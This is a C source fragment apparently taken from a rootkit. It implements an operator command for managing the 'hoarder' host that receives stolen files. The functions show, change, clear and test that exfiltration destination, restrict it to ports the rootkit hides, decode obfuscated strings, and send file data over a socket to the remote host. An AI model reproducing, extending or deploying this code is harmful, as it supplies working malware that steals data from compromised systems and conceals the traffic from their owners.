void options_stolenstore(const char *a0, const char *a1, const char *ssopt, const int optmode){
    if(!ssopt) optusgndie(a0, a1, validssopts, 16);
    switch(optmode){
        case SSOPTS_CHANGE:
            bxprintf(CHANGE_HOARDER_HOST_FORMAT, a0, a1, ssopt);
            break;
        default:
            options_stolenstore(a0, a1, NULL, -1);
    }
    exit(0);
}

int __attribute((visibility("hidden"))) valid_newdest(const char *newdest, u_short *port){
    *port = (u_short)atoi(strchr(newdest, ':') + 1);
    int valid = 0;
    for(size_t c = 0; c < mvbc->portcount && !valid; c++)
        valid = *port == mvbc->hideports[c];
    return valid;
}

void dostolenstore(char *const argv[]){
    if(!reinitmvbc()){
        xperror(REINITMVBC);
        return;
    }

    const char *ssopt;
    int mode;
    if(!(ssopt = argv[2]) || (mode = getoptmode(ssopt, validssopts)) < 0)
        options_stolenstore(argv[0], argv[1], NULL, -1);

    switch(mode){
        const char *newdest;
        u_short port;
        case SSOPTS_SHOW:
            printf("%s\n", mvbc->hoarder_host);
            break;
        case SSOPTS_CHANGE:
            if(!(newdest = argv[3]) || !strchr(newdest, ':') || strlen(newdest) >= sizeof(mvbc->hoarder_host)-1)
                options_stolenstore(argv[0], argv[1], ssopt, mode);
            if(!valid_newdest(newdest, &port)){
                bxprintf(HOARDER_HOST_PORT_NOT_HIDDEN, port);
                break;
            }
            writeover(mvbc->hoarder_host, newdest);
            updbdvcfg(mvbc);
            bxprintf(HOARDER_HOST_CHANGED_MSG, get_hoarder_host(mvbc), get_hoarder_port(mvbc));
            break;
        case SSOPTS_CLEAR:
            writeover(mvbc->hoarder_host, "\0");
            updbdvcfg(mvbc);
            break;
        case SSOPTS_TEST:
            if(!is_hidden_port(get_hoarder_port(mvbc))){
                bxprintf(HOARDER_HOST_PORT_NOT_HIDDEN_TEST, get_hoarder_port(mvbc));
                break;
            }
            char *hoarder_testfile = xordup(HOARDER_TEST_CONNECTION_FILE);
            if(!hoarder_testfile){
                xperror(XORDUP);
                break;
            }
            bxprintf(HOARDER_TESTING_CONNECTION_MSG, hoarder_testfile);
            int sockfd = prepare_hoarder_connection();
            if(sockfd < 0){
                xperror(SOCKET);
                clean(hoarder_testfile);
                break;
            }
            sendfileinfo(sockfd, NULL, hoarder_testfile, getfilesize(hoarder_testfile));
            shutdown(sockfd, SHUT_RDWR);
            close(sockfd);
            bxprintf(HOARDER_TEST_FILEINFO_SENT, 0);
            break;
    }
}